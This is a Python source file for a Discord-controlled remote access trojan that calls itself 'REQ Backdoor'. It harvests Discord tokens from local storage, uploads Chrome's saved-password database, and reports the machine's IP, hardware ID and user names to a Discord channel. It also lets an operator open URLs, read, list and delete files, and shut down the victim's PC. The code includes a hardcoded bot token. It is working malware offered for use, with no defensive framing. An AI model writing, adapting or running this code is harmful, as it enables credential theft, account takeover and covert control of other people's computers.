import re, os, requests, json, shutil, discord, webbrowser, ctypes
from discord.ext import commands
from base64 import b64decode
from json import loads
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import platform as plt

Token = "ODA5ODcwODk4MzY2NTEzMjUz.YCbZDA.MvhK9BBv0FkBLkwNo3JYhLvi1xs"
os.system("cls")

client = commands.Bot(command_prefix=".")

def ErrorMsg():
    embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
    embed.add_field(name = "Error", value = f"Error :(")
    embed.set_footer(text = "REQ Backdoor・Monstered")
    return embed

def GetIP():
    return requests.get("https://api.ipify.org/").text

def Headers(token=None):
	headers = {"content-type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}

	if token:
		headers.update({"Authorization": token})
	return headers

def Payment(token):
	try:
		return bool(len(loads(urlopen(Request("https://discord.com/api/v8/users/@me/billing/payment-sources", headers=Headers(token))).read().decode())))
	except:
		pass

def Hwid():
	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def Tokens(path):
	tokens = []

	for file in os.listdir(path):
		if not file.endswith(".log") and not file.endswith(".ldb"):
			continue
		for l in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
			for mst in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in re.findall(mst, l):
					tokens.append(token)
	return tokens

OS = plt.platform().split("-")
name = os.getenv("UserName")
Username = os.getenv("COMPUTERNAME")
dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}
ids = []

@client.command()
async def tokens(ctx):
	
	for platform, path in dire.items():
		for token in Tokens(path):
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in ids:
					continue
			ids.append(uid)
			payment = bool(Payment(token))

			messages = f"```ARM\nTokens: {token}\n```"
	await ctx.send(messages)

@client.command()
async  def check(ctx):
    OS = plt.platform().split("-")
    name = os.getenv("UserName")
    Username = os.getenv("COMPUTERNAME")
    messages = f"```ARM\nIP: {GetIP()}\n```" +  f"```ARM\nHWID: {Hwid()}\n```" + f"```ARM\nPC Username: {Username}\n```" + f"```ARM\nPC Name: {name}\n```" + f"```ARM\nProduct Name: {OS[0]} {OS[1]}\n```"
    await ctx.send(messages)

@client.command()
async def getpwd(ctx, IP):
    if IP == GetIP():
        await ctx.send(file = discord.File(f"C:\\Users\\{name}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"))

@client.command()
async def run(ctx, IP, url):

    if IP == GetIP():
        webbrowser.open(url)
        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
        embed.add_field(name = "Open url", value = f"[*] Url open successfully `{url}`")
        embed.set_footer(text = "REQ Backdoor・Monstered")
        await ctx.channel.send(embed = embed)
    else:
        await ctx.channel.send(embed = ErrorMsg())

@client.command()
async def message(ctx, IP, msg):
    if IP == GetIP():
        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
        embed.add_field(name = "MessageBox", value = f"[*] Message sent successfully `{msg}`")
        embed.set_footer(text = "REQ Backdoor・Monstered")
        await ctx.channel.send(embed = embed)
        ctypes.windll.user32.MessageBoxW(0, msg, "", 1)
    else:
        await ctx.channel.send(embed = ErrorMsg())

@client.command()
async def admin(ctx, IP):
    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if IP == GetIP():
        if admin == True:
            embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
            embed.add_field(name = "Admin check", value = "[*] The bot is admin")
            embed.set_footer(text = "REQ Backdoor・Monstered")
            await ctx.channel.send(embed = embed)

        elif admin == False:
            embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
            embed.add_field(name = "Admin check", value = "[*] The bot is not admin")
            embed.set_footer(text = "REQ Backdoor・Monstered")
            await ctx.channel.send(embed = embed)
    else:
        await ctx.channel.send(embed = ErrorMsg())

@client.command()
async def shutdown(ctx, IP):
    if IP == GetIP():
        os.system("shutdown /s /t 1")
        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
        embed.add_field(name = "Shutdown", value = "[*] Shutdowning successfully")
        embed.set_footer(text = "REQ Backdoor・Monstered")
        await ctx.channel.send(embed = embed)
    else:
        await ctx.channel.send(embed = ErrorMsg())


@client.command()
async def cwd(ctx, IP):
    if IP == GetIP():
        cwd = str(os.getcwd)
        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
        embed.add_field(name = "View cwd", value = f"`{cwd}`")
        embed.set_footer(text = "REQ Backdoor・Monstered")
        await ctx.channel.send(embed = embed)
    else:
        await ctx.channel.send(embed = ErrorMsg())

@client.command()
async def look(ctx, IP, dir):
    if IP == GetIP():
        dir = os.listdir(dir)
        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
        embed.add_field(name = "Look directory", value = dir)
        embed.set_footer(text = "REQ Backdoor・Monstered")
        await ctx.channel.send(embed = embed)
    else:
        await ctx.channel.send(embed = ErrorMsg())

@client.command()
async def remove(ctx, IP, file):  
    if IP == GetIP():
        os.remove(file)
        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
        embed.add_field(name = "Remove file", value = file)
        embed.set_footer(text = "REQ Backdoor・Monstered")
        await ctx.channel.send(embed = embed)
    else:
        await ctx.channel.send(embed = ErrorMsg())

@client.command()
async def read(ctx, IP, file):
    if IP == GetIP():
        files = open(file, "r").read()
        await ctx.channel.send(f"```\n{files}\n```")
    else:
        await ctx.channel.send(embed = ErrorMsg())


@client.command()
async def menu(ctx):
    embed = discord.Embed(title = "Help Menu", color=0xFC4D4D)
    embed.add_field(name = "$message <IP> <message>", value = "Sent a message box")
    embed.add_field(name = "$run <IP> <url>", value = "open the webbrowser")
    embed.add_field(name = "$admin <IP>", value = "Check if the pc is admin")
    embed.add_field(name = "$cwd <IP>", value = "Check the file rat directory")
    embed.add_field(name = "$look <IP> <directory>", value = "Watch directory content")
    embed.add_field(name = "$remove <IP> <file>", value = "Remove the file")
    embed.add_field(name = "$read <IP> <directory>", value = "Read the content of the file")
    embed.add_field(name = "$screen <IP>", value = "Take screen of computer")
    embed.add_field(name = "$shutdown <IP>", value = "Shutdown the pc")
    embed.set_footer(text = "REQ Backdoor・Monstered")
    await ctx.channel.send(embed = embed)

client.run(Token)
